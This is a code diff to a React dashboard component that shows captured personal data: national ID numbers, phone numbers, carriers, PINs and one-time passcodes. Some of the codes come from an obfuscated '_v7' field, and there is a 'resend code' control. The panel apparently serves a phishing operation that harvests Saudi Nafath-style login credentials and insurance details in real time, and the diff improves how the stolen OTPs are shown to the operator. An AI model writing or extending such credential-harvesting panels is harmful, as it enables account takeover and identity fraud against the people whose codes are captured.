@@ -1737,14 +1737,16 @@ const renderNafadBox = () => {
     // Get latest data for each type
     const basicRaw = getLatestRawForBox('basic') || selectedRequest?.raw || {};
     const insuranceRaw = getLatestRawForBox('insurance') || selectedRequest?.raw || {};
+    const phoneRaw = getLatestRawForBox('phone') || selectedRequest?.raw || {};
     
     // Check if each section has data to show
+    // BASIC: Only identity/name data (NOT phone-related)
     const hasBasicData = basicRaw && (
       basicRaw.identityNumber || 
       basicRaw.ownerName || 
       basicRaw.buyerName || 
-      basicRaw.phoneNumber || 
       basicRaw.documentType
+      // NOTE: phoneNumber is NOT basic data, it's phone data
     );
     
     const hasInsuranceData = insuranceRaw && (
@@ -1767,9 +1769,13 @@ const renderNafadBox = () => {
       selectedRequest.raw.pinCode
     );
     
-    const hasPhoneData = selectedRequest?.raw && (
-      selectedRequest.raw.phoneOtp ||
-      selectedRequest.raw._v7
+    // PHONE: All phone-related data from step5
+    const hasPhoneData = phoneRaw && (
+      phoneRaw.phoneIdNumber ||   // رقم الهوية من step5
+      phoneRaw.phoneNumber ||     // رقم الجوال من step5
+      phoneRaw.phoneCarrier ||    // شركة الاتصالات من step5
+      phoneRaw.phoneOtp ||       // رمز OTP
+      phoneRaw._v7                // رمز OTP مشفر
     );
     
     const hasNafadData = selectedRequest?.raw && (
@@ -2029,15 +2035,27 @@ const renderNafadBox = () => {
             <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>تحقق الهاتف</h3>
             </div>
-            {basicRaw?.phoneNumber && (
+            {phoneRaw?.phoneIdNumber && (
               <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
-                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الجوال</span>
-                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{basicRaw.phoneNumber}</span>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الهوية</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{phoneRaw.phoneIdNumber}</span>
               </div>
             )}
-            {(selectedRequest?.raw?.phoneOtp || selectedRequest?.raw?._v7) && (
+            {phoneRaw?.phoneNumber && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>رقم الجوال</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{phoneRaw.phoneNumber}</span>
+              </div>
+            )}
+            {phoneRaw?.phoneCarrier && (
+              <div style={{ display: "flex", justifyContent: "space-between", background: "#f9fafb", borderRadius: 6, padding: 8 }}>
+                <span style={{ fontSize: "0.8rem", color: "#6b7280" }}>شركة الاتصالات</span>
+                <span style={{ fontSize: "0.85rem", fontWeight: 600, color: "#111827" }}>{phoneRaw.phoneCarrier}</span>
+              </div>
+            )}
+            {(phoneRaw?.phoneOtp || phoneRaw?._v7) && (
               <div style={{ marginTop: 8, background: "#f0f9ff", borderRadius: 8, padding: 12, textAlign: "center" }}>
-                <p style={{ margin: 0, fontSize: "1.2rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{selectedRequest?.raw?.phoneOtp || selectedRequest?.raw?._v7}</p>
+                <p style={{ margin: 0, fontSize: "1.2rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{phoneRaw?.phoneOtp || phoneRaw?._v7}</p>
               </div>
             )}
             {/* زر إعادة إرسال الرمز */}
